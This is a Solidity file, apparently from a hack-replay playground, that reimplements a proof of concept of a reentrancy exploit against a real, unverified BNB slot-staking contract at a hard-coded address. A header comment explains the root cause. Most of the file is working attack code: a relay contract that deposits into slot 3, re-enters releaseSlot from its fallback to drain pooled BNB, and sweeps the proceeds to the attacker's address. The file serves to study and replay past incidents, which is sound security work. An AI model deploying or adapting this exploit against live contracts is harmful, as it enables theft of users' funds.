// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-02-unverified_35bc).
// The DeFiHackLabs PoC (test/unverified_35bc_exp.sol) has the whole attack run
// INLINE in the constructor of a small `AttackerC` contract deployed with
// `new AttackerC{value: 0.6 ether}()` from `testPoC()`. `AttackerC`'s
// constructor itself deploys a `HelperB` contract and calls `HelperB.attack()`,
// which is what actually deposits into and re-enters the unverified victim's
// `releaseSlot(3)`. Because recordExploit.ts records exactly one function call
// after an UNRECORDED deploy (it can never record a constructor), this is
// reproduced as a SYNTHETIC exploit with the attack logic moved into a
// callable `run()` entrypoint.
//
// Since the vulnerable victim is UNVERIFIED (bytecode-only, no source view),
// there is no verified-source fallback for locators pointing at helper-only
// code the way e.g. 2024-02-ADC.mjs anchors its inner-contract beats on the
// verified MainPool source. So — unlike the original AttackerC/HelperB split
// — ALL of the deposit + reentrancy-trigger + forward-proceeds logic that
// needs an editorial locator lives directly in `UnverifiedSlotDrain` (the
// single deployed "exploit" contract recordExploit.ts source-maps). The
// unavoidable minimum stays in a separate `ReentrantRelay` contract: only
// `fallback()` needs a distinct deployed address, because it must be the
// actual `msg.sender` that `releaseSlot()` calls back into on every reentrant
// refund — code living on UnverifiedSlotDrain itself is never that recipient,
// since UnverifiedSlotDrain never calls releaseSlot() directly. Logic,
// constants, and the call sequence are copied verbatim from
// test/unverified_35bc_exp.sol's AttackerC/HelperB.
//
// Root cause: the unverified victim contract (0xDE91E69...c2d85278) is a BNB
// "slot" staking contract. `unlockSlot(uint256)` activates a slot with a BNB
// deposit; `releaseSlot(uint256)` (selector 0x2dad6442) refunds that deposit
// but sends the BNB via a low-level call BEFORE clearing the slot's
// active/amount state (checks-effects-interactions violation, no reentrancy
// guard). ReentrantRelay's `fallback()` re-enters `releaseSlot(3)` on every
// refund received, and since the slot still reads as active with its
// original amount, each reentrant call pays out another 0.6 BNB from the
// contract's pooled BNB until the contract runs out of funds.

// Minimal relay whose ONLY job is to be the reentrant call target: every BNB
// refund releaseSlot() sends lands in its fallback(), which re-enters
// releaseSlot(3) again. Its deposit()/fallback() mirror HelperB.attack()'s
// unlockSlot/releaseSlot calls and HelperB.fallback() (lines 71-88 of
// test/unverified_35bc_exp.sol) verbatim; kept separate from
// UnverifiedSlotDrain purely because it must be the actual address
// releaseSlot() calls back into during the reentrant loop.
contract ReentrantRelay {
    address private constant VICTIM = 0xDE91E6E937Ec344e5a3C800539C41979c2d85278;

    // Deposits msg.value into slot 3 (mirrors HelperB.attack()'s
    // unlockSlot(3) call, line 71), then immediately calls releaseSlot(3)
    // (line 74) to start the reentrant drain loop.
    function deposit() external payable {
        (bool ok1, ) = VICTIM.call{value: msg.value}(
            abi.encodeWithSelector(bytes4(keccak256("unlockSlot(uint256)")), uint256(3))
        );
        if (!ok1) {}

        (bool ok2, ) = VICTIM.call(abi.encodeWithSelector(bytes4(0x2dad6442), uint256(3)));
        if (!ok2) {}
    }

    // Every reentrant BNB refund releaseSlot() sends lands here and
    // immediately re-enters releaseSlot(3) on the still-active slot.
    fallback() external payable {
        (bool ok, ) = VICTIM.call(abi.encodeWithSelector(bytes4(0x2dad6442), uint256(3)));
        if (!ok) {}
    }

    // Forward this relay's entire collected BNB balance to `to` (the
    // attacker EOA), called once the reentrant loop has fully unwound.
    function sweep(address payable to) external {
        (bool s, ) = to.call{value: address(this).balance}("");
        if (!s) {}
    }
}

contract UnverifiedSlotDrain {
    ReentrantRelay internal relay;

    // Mirrors AttackerC's constructor calling into HelperB.attack() (lines
    // 43-58, 69-82 of test/unverified_35bc_exp.sol), moved into a callable
    // entrypoint so the recorder can capture it as the single recorded call
    // after an unrecorded deploy (a constructor itself can never be recorded).
    function run() external payable {
        // deploy the minimal reentrant relay
        relay = new ReentrantRelay();

        // deposit the full 0.6 BNB into slot 3 via the relay (so the relay,
        // not this contract, is the address releaseSlot() calls back into),
        // then trigger the first releaseSlot(3) refund — this starts the
        // reentrant drain loop.
        relay.deposit{value: msg.value}();

        // forward the drained BNB (10.8 ether) collected by the relay on to
        // the caller (the attacker EOA).
        relay.sweep(payable(msg.sender));
    }

    // receive to accept any stray refunds.
    receive() external payable {}
}
